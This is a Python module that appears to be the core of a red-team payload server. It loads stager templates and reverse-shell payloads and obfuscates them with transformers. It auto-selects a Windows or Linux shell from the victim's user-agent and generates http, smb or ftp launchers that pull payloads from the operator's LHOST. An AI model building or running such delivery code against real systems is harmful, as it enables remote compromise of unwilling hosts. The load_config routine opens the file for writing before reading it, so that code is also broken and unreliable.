import json
import shlex
import logging as logger
import os
from pathlib import Path

import jsonpickle
import user_agents
from colorama import Fore
from watchdog.events import DirModifiedEvent, FileSystemEventHandler
from watchdog.observers import Observer

from .cvars import PLACEHOLDER_L, PLACEHOLDER_R, CvarManager

PLACEHOLDER_SHELL = f"{PLACEHOLDER_L}SHELL{PLACEHOLDER_R}"
PLACEHOLDER_SHELLBIN = f"{PLACEHOLDER_L}SHELLBIN{PLACEHOLDER_R}"


class PssShell:
    def __init__(self, name, data):
        self.name = name.lower()
        self.payload = data["payload"]

    def get_cvars(self, cvars: CvarManager):
        return cvars.get_cvars_str(self.payload)

    def fill(self, cvars: CvarManager) -> str:
        filled_payload = self.payload
        for cvar in cvars.get_cvars_str(filled_payload):
            filled_payload = cvars.insert_cvar(cvar, filled_payload)
        return filled_payload

    def __str__(self) -> str:
        return self.name


class PssLauncher:
    def __init__(self, name, style, data):
        self.name = name.lower()
        self.style = style.lower()
        self.payload = data["payload"]

    def get_cvars(self, cvars: CvarManager):
        return cvars.get_cvars_str(self.payload)

    def fill(self, cvars: CvarManager) -> str:
        filled_payload = self.payload
        for cvar in cvars.get_cvars_str(filled_payload):
            filled_payload = cvars.insert_cvar(cvar, filled_payload)
        return filled_payload

    def __str__(self) -> str:
        return f"{self.style}/{self.name}"


class PayloadManagerConfig:
    def __init__(self):
        self.cvars = CvarManager()
        self.stagers = []
        self.shells = []
        self.launchers = []
        self.transformers = {}
        self.stager_folder = Path("./stagers/")
        self.serve_folder = None
        self.accept_uploads = True
        self.uploads_folder = None
        self.uploads_use_serve_folder = False


class PayloadManager(FileSystemEventHandler):
    def __new__(cls):
        if not hasattr(cls, "instance"):
            cls.instance = super(PayloadManager, cls).__new__(cls)
            cls.instance.cfg = PayloadManagerConfig()

            cls.instance.serve_files = []
            cls.instance.serve_file_blacklist = ["__init__.py"]
            cls.instance.serve_file_ext_whitelist = [".sh", ".py", ".exe", ".dll"]

            cls.instance.fs_observer = Observer()
            cls.instance.fs_observer.daemon = True
            cls.instance.fs_observer.start()
        return cls.instance

    @property
    def shell_count(self) -> int:
        return len(self.cfg.shells)

    @property
    def shell_names(self) -> list:
        shell_names = []
        for shell in self.cfg.shells:
            shell_names.append(shell.name)
        return sorted(shell_names)

    @property
    def launcher_count(self) -> int:
        return len(self.cfg.launchers)

    @property
    def launcher_names(self) -> list:
        launcher_names = []
        for launcher in self.cfg.launchers:
            launcher_names.append(launcher.name)
        return sorted(launcher_names)

    @property
    def stager_count(self) -> int:
        return len(self.cfg.stagers)

    @property
    def transformer_count(self) -> int:
        return len(self.cfg.transformers)

    @property
    def cvars(self) -> CvarManager:
        return self.cfg.cvars

    def save_config(self, config_path):
        logger.info(f'Saved config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"')

        try:
            with open(config_path, "w+") as cfg_file:
                cfg_file.write(jsonpickle.encode(self.cfg))
        except Exception as ex:
            logger.warning(f'Failed to save file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}')

    def load_config(self, config_path):
        if config_path.exists():
            try:
                with open(config_path, "w+") as cfg_file:
                    self.cfg = jsonpickle.decode(cfg_file.read())

                logger.info(f'Loaded config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"')
            except Exception as ex:
                logger.warning(f'Failed to load file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}')
        else:
            logger.warning(f'Config file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}" does not exist')

    def update_serve_folder_watchdog(self):
        self.fs_observer.unschedule_all()
        self.fs_observer.schedule(self, self.cfg.serve_folder, recursive=True)
        self.on_any_event(None)

    def on_any_event(self, event):
        if event is None or isinstance(event, DirModifiedEvent):

            def get_serve_files():
                for file in get_all_files(self.cfg.serve_folder):
                    if file.name not in self.serve_file_blacklist and file.suffix.lower() in self.serve_file_ext_whitelist:
                        yield str(file.relative_to(self.cfg.serve_folder))

            self.serve_files = sorted(get_serve_files())

    def transformer_register(self, cls, enabled=False):
        self.cfg.transformers[cls.__name__] = {"transformer": cls(), "enabled": enabled}

    def load_stagers(self, folder):
        self.cfg.stager_folder = folder
        self.cfg.stagers = []

        def stager_process_path(stager_path: Path):
            return str(stager_path).replace("\\", "/").replace("//", "/")

        for stager in [stager_process_path(x.relative_to(folder)) for x in get_all_files(folder)]:
            if self.stager_get_path(stager) is not None:
                self.cfg.stagers.append(stager)
            else:
                logger.warning(f'Invalid stager "{stager}"')

    def stager_exists(self, stager: str) -> bool:
        if stager.startswith("/"):
            stager = stager[1:]
        return stager.lower() in self.cfg.stagers

    def stager_get_path(self, stager: str) -> Path or None:
        if stager.startswith("/"):
            stager = stager[1:]

        p = Path(self.cfg.stager_folder, stager)
        return p if p.exists() else None

    def stager_get_content(self, stager: str) -> str or None:
        stager_path = self.stager_get_path(stager)

        if stager_path:
            with open(stager_path) as stager_file:
                return stager_file.read()

        return None

    def load_shells(self, shells_json):
        for shell, data in json.loads(shells_json).items():
            self.cfg.shells.append(PssShell(shell, data))

    def shell_try_get(self, shell_name: str) -> PssShell or None:
        if shell_name is not None:
            shell_name = shell_name.lower()
            for shell in self.cfg.shells:
                if shell.name == shell_name:
                    return shell
        return None

    def shell_get_payload(self, shell_name: str) -> str or None:
        shell = self.shell_try_get(shell_name)
        return shell.payload if shell else None

    def tranformer_switch(self, transformer, status=None):
        if transformer in self.cfg.transformers:
            if status is None:
                self.cfg.transformers[transformer]["enabled"] = not self.cfg.transformers[transformer]["enabled"]
            else:
                self.cfg.transformers[transformer]["enabled"] = status

            if self.cfg.transformers[transformer]["enabled"]:
                logger.info(f"{transformer} {Fore.LIGHTGREEN_EX}enabled{Fore.RESET}")
            else:
                logger.info(f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")
        else:
            logger.warning(f'Tranformer named "{transformer}" does not exist')

    def build_payload(self, stager: str, user_agent: str = None) -> str or None:
        shell = None
        shell_inserted = False
        stager_path = self.stager_get_path(stager)

        if stager_path:
            stager_content = self.stager_get_content(stager)

            if self.cvars.has_cvar(stager_content, "SHELL"):
                shell = self.shell_try_get(self.cvars.SHELL)

                if not shell:
                    logger.warning("Stager requested a shell but none was given!")

                    try:
                        possible_os = user_agents.parse(user_agent).get_os().lower()
                        logger.warning(f"OS detected by user-agent: {Fore.LIGHTYELLOW_EX}{possible_os}{Fore.RESET}")

                        # try to auto select a suiteable shell
                        if possible_os == "windows":
                            shell = self.shell_try_get("powershell_simple")
                        elif possible_os == "linux":
                            shell = self.shell_try_get("bash_i_c")

                        if shell:
                            logger.warning(f"Auto-selected shell: {Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}")
                        else:
                            logger.warning("No suiteable shell found")

                    except:
                        logger.warning("Failed to auto-select a shell by user-agent")

                if shell:
                    # insert all the shell cvars, because they might become unreadable during transformation
                    shell_payload = shell.fill(self.cvars)

                    # apply the transformers on shell
                    for transformer in self.cfg.transformers.keys():
                        t = self.cfg.transformers[transformer]

                        if t["enabled"]:
                            tr = t["transformer"]
                            stager_content = tr.trim_chars(stager_content, PLACEHOLDER_SHELL)
                            shell_payload = tr.transform(shell_payload)

                    stager_content = stager_content.replace(PLACEHOLDER_SHELL, shell_payload)
                    shell_inserted = True

            # insert all the remaining cvars
            for cvar in self.cvars.get_cvars_str(stager_content):
                if cvar == "SHELL" and shell_inserted:
                    continue
                stager_content = self.cvars.insert_cvar(cvar, stager_content)

            return stager_content
        return None

    def load_launchers(self, launchers_json):
        for style, launchers in json.loads(launchers_json).items():
            for launcher, data in launchers.items():
                self.cfg.launchers.append(PssLauncher(launcher, style, data))

    def launcher_try_get(self, launcher_name: str) -> PssLauncher or None:
        if launcher_name is not None:
            launcher_name = launcher_name.lower()
            for launcher in self.cfg.launchers:
                if launcher.name == launcher_name:
                    return launcher
        return None

    def launcher_generate(self, launcher_name: str, suffix: str, smb_share: str):
        launcher = self.launcher_try_get(launcher_name)

        if launcher:
            # handle cvars
            payload = launcher.fill(self.cvars)

            # handle uri
            placeholders = {
                "http": f"http://{self.cvars.LHOST}/{suffix}",
                "smb": f"\\\\{self.cvars.LHOST}\\{smb_share}\\{suffix}",
                "ftp": f"ftp://anonymous@{self.cvars.LHOST}/{suffix}",
            }

            if launcher.style in placeholders:
                payload = payload.replace(f"{PLACEHOLDER_L}TAG{PLACEHOLDER_R}", placeholders[launcher.style])

            # handle special tags
            special_replaces = {
                "FILENAME": lambda s: Path(s).name,
            }

            try:
                for tag, fn in special_replaces.items():
                    payload = payload.replace(f"{PLACEHOLDER_L}{tag}{PLACEHOLDER_R}", fn(suffix))
            except:
                pass

            return payload
        else:
            logger.warning(f'Launcher named "{launcher_name}" does not exist')

        return None


def get_all_files(path: str or Path):
    if not isinstance(path, Path):
        path = Path(path)

    if path.exists():
        for currentpath, _, files in os.walk(path):
            for file in files:
                yield Path(currentpath, file)
